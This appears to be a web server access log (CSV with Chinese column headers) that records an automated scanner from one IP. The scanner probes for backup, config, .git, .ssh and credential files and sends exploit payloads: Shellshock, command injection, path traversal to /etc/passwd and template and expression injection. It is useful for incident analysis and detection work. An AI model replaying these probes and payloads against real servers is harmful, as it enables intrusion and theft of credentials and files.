date(日期),time(时间),s-ip(服务器 IP 地址),cs-method(请求方法),cs-uri-stem(URI 资源 ),cs-uri-query(URI 查询),s-port(服务器端口),c-ip(客户端 IP 地址),cs(User-Agent)(浏览器类型),sc-status(状态码)
2023-02-17,05:37:44,10.115.98.108,GET,/mvmfhmtdcf,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/webshell.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/_phpmyadmin/index.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/phpMyAdmin/index.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/1.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.git/index,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/pma/index.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/1.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/index.php~,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/heazarlasi,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/1.jspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/config.php~,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/logs/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/1.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/zwgygprhgg,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/index.php.bak,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/1.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/config.php.bak,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/source/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/odmstpvqhw,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/s.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/db.php.bak,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/yummgvdbuw,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/key,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/s.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/config.inc.php.bak,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/s.jspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/yiybrdhaen,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/s.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/zabbix/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin.html,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.index.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/qgrfbyghzl,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/s.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.config.inc.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/mailsms/s,func=ADMIN:appState&dumpConfig=/,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/debug/pprof/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/keys,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.rediscli_history,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/secret_key,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/mxykyguehc,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin.do,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/secret,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/WEB-INF/web.xml,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.secret,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/ygrdravfgt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/login.html,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/Pages/login.htm,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/login.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.key,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/jenkins/script,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/syfiuscpeb,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.secret_key,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.idea/workspace.xml,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/login.do,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/x.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/config/.config.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/gvxknenlgy,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/aqzwhwmdqd,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/backup/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/readme.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/api/ping,count=5&host=;echo%20$(expr%20925761003%20%2b%20934670405):925761003:925761003;&port=80&source=1.1.1.1&type=icmp,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/login.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/x.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/uugmovdtoz,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.config.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/env,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/x.jspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/login.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/readme.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/tupvuzsldg,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/actuator/env,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/help/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/readme,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/login,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.settings.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/index.htm,PAGE=web,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/x.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/wivxorpese,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/README.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/mobile/auth_mobi.php,isAvatar=1&uid=1&P_VER=0,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.database.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/crossdomain.xml,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/,-,881,106.6.165.59,()+{+:;+};+echo;+echo;+/bin/bash+-c+'expr+956056307+++852008261',200
2023-02-17,05:37:44,10.115.98.108,GET,/uwxgeohmlh,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/x.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/tag_test_action.php,url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md52062276552;{/dede:field},881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/README.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/admin/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.ssh/known_hosts,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.db.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/ooxx.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/README,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/signin,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/mehzkywxzd,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.bashrc,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/index.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/tests/generate.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.mysql.php.swp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/cgi-bin/kerbynet,Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20816813867%20-%20896793192%0A%27,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/jsp/help-sb-download.jsp,sbFileName=../../../etc/passwd,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/user/login,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/objects/getSpiritsFromVideo.php,base64Url=YGVjaG8gd3BheG1jZ3ggPiBlenRqLnR4dGA%3D&format=jpg,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/LICENSE.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/download.php,file=../../../../../etc/passwd,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.zshrc,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/oxrhxxawwm,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/device.rsp,opt=user&cmd=list,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/ooxx.jsp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/NCFindWeb,service=IPreAlertConfigService&filename=WEB-INF/web.xml,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/objects/eztj.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/zabbix.php,action=dashboard.view&dashboardid=1,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/.bash_profile,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/data/pbootcms.db,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/LICENSE.txt,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/db.inc,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/bhhodxfnnr,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:44,10.115.98.108,GET,/ooxx.jspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/.bash_logout,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/a.out,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/php/setup.php,step=2&PDF2SWF_PATH=printf%20erwbnz%25%25erwbnz%20%3e%20oebayg,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/xfyqppvwuh,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/LICENSE,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/ooxx.asp,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/oauth/authorize,response_type=${41721*43368}&client_id=acme&scope=openid&redirect_uri=http://test,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/plus/guestbook.php,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/config/database.yml,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/php/oebaygpdf2swf,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/ooxx.aspx,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/composer.json,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/CHANGELOG.md,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/rwrtxnupqd,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
2023-02-17,05:37:45,10.115.98.108,GET,/WEB-INF/web.xml,-,881,106.6.165.59,Mozilla/5.0+(Windows+NT+10.0;+rv:78.0)+Gecko/20100101+Firefox/78.0,200
